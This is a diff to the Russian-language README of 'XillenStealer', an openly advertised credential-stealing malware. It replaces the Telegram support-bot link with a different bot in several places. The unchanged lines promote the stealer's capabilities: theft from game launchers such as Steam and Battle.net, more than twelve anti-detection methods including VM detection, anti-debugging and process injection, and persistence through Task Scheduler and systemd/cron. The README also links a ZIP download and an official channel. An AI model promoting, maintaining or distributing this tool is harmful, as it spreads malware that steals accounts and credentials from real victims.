@@ -381,7 +381,7 @@ cd electron_builder && npm start
 | **Поддерживаются ли игровые лаунчеры?** | Да, Steam, Epic Games, Minecraft, Origin, Uplay, Battle.net |
 | **Есть ли анти-детекция?** | Да, 12+ методов включая VM Detection, Anti-Debug, Process Injection |
 | **Как работает персистентность?** | Автозапуск через Task Scheduler (Windows) и systemd/cron (Linux) |
-| **Куда обращаться с вопросами?** | По всем вопросам пишите **[@XillenStealerSupportBot](https://t.me/XillenStealerSupportBot)** - не пишите в личные сообщения! |
+| **Куда обращаться с вопросами?** | По всем вопросам пишите **[@dx_8821_relay_bot](https://t.me/dx_8821_relay_bot)** - не пишите в личные сообщения! |
 | **Где официальный канал?** | Официальный канал стиллера: **[t.me/XillenStealer](https://t.me/XillenStealer)** |
 
 </div>
@@ -692,10 +692,10 @@ pip install -r requirements.txt
 **Разработчик: [Xillen Killers](https://github.com/BengaminButton)**
 
 ### 📢 **Важно!**
-**По всем вопросам пишите [@XillenStealerSupportBot](https://t.me/XillenStealerSupportBot) - не пишите в личные сообщения!**
+**По всем вопросам пишите [dx_8821_relay_bot](https://t.me/dx_8821_relay_bot) - не пишите в личные сообщения!**
 
 [![Telegram Channel](https://img.shields.io/badge/📢%20Официальный%20канал-t.me/XillenStealer-2CA5E0?logo=telegram)](https://t.me/XillenStealer)
-[![Telegram Support](https://img.shields.io/badge/💬%20Поддержка-@XillenStealerSupportBot-2CA5E0?logo=telegram)](https://t.me/XillenStealerSupportBot)
+[![Telegram Support](https://img.shields.io/badge/💬%20Поддержка-dx_8821_relay_bot-2CA5E0?logo=telegram)](https://t.me/dx_8821_relay_bot)
 [![GitHub](https://img.shields.io/badge/GitHub-@BengaminButton-181717?logo=github)](https://github.com/BengaminButton)
 
 </div>
@@ -719,11 +719,11 @@ pip install -r requirements.txt
 ### 🚀 **Быстрые ссылки:**
 [![Download ZIP](https://img.shields.io/badge/📥%20Скачать%20ZIP-45MB-blue?style=for-the-badge)](https://github.com/BengaminButton/XillenStealer/archive/refs/heads/main.zip)
 [![Telegram Channel](https://img.shields.io/badge/📢%20Официальный%20канал-t.me/XillenStealer-2CA5E0?style=for-the-badge)](https://t.me/XillenStealer)
-[![Telegram Support](https://img.shields.io/badge/💬%20Поддержка-@XillenStealerSupportBot-2CA5E0?style=for-the-badge)](https://t.me/XillenStealerSupportBot)
+[![Telegram Support](https://img.shields.io/badge/💬%20Поддержка-dx_8821_relay_bot-2CA5E0?style=for-the-badge)](https://t.me/dx_8821_relay_bot)
 [![GitHub](https://img.shields.io/badge/💻%20GitHub-@BengaminButton-181717?style=for-the-badge)](https://github.com/BengaminButton)
 
 ### ⚠️ **Внимание!**
-**По всем вопросам пишите [@XillenStealerSupportBot](https://t.me/XillenStealerSupportBot) - не пишите в личные сообщения!**
+**По всем вопросам пишите [dx_8821_relay_bot](https://t.me/dx_8821_relay_bot) - не пишите в личные сообщения!**
 
 ---
 
